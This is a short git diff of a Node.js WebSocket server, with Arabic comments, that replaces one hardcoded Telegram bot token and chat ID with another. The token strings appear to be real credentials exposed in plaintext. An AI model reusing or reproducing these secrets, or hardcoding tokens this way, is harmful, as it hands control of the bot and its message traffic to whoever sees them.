@@ -11,8 +11,8 @@ const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
 // إعداد بيانات تيليجرام
-const TELEGRAM_TOKEN = '8092974225:AAHBVb_xV--U13CnjJtsuozuvqTXGLBkyvY';
-const TELEGRAM_CHAT_ID = '8065592332';
+const TELEGRAM_TOKEN = '7268249504:AAE2TjqhwBoqgFw6z6jjVN7838Jpj8dO2EE';
+const TELEGRAM_CHAT_ID = '6837315281';
 const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
 
 // تخزين بيانات الأجهزة المتصلة
